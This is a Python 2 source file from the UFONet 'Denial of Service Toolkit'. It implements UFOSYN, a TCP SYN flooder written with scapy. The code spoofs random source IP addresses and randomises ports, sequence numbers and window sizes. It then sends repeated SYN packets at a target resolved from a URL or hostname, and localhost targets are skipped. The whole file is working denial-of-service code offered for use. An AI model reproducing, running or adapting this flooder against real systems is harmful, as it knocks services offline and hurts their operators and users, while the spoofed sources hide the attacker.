#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - Denial of Service Toolkit - 2018 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, time, urlparse

try:
    from scapy.all import *
except:
    print "\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python-scapy' or 'pip install scapy'\n"
    sys.exit(2)

# UFONet TCP SYN Flooder (UFOSYN)
def randIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1,65535) # TCP ports
    return x	

def synize(ip, port, rounds):
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            sport = randInt()
            seq = randInt()
            window = randInt()
            IP_p = IP()
            IP_p.src = randIP()
            try:
                IP_p.dst = ip
            except:
                print "[Error] [AI] [UFOSYN] Imposible to resolve IP from target -> [Aborting!]\n"
                break
            TCP_l = TCP()	
            TCP_l.sport = sport
            TCP_l.dport = port
            TCP_l.flags = "S" # SYN
            TCP_l.seq = seq
	    TCP_l.window = window
            try:
                send(IP_p/TCP_l, verbose=0)
                print "[Info] [AI] [UFOSYN] Firing 'quantum hook' ["+str(n)+"] -> [FLOODING!]"
                time.sleep(1) # sleep time required for balanced sucess
            except:
                print "[Error] [AI] [UFOSYN] Failed to engage with 'quantum hook' ["+str(n)+"]"
    except:
        print("[Error] [AI] [UFOSYN] Failing to engage... -> Is still target online? -> [Checking!]")

class UFOSYN(object):
    def attacking(self, target, rounds):
        print "[Info] [AI] TCP SYN Flooder (UFOSYN) is ready to fire: [" , rounds, "quantum hooks ]"
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print "[Info] [AI] [UFOSYN] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n"
            return
        synize(ip, port, rounds) # attack with UFOSYN using threading
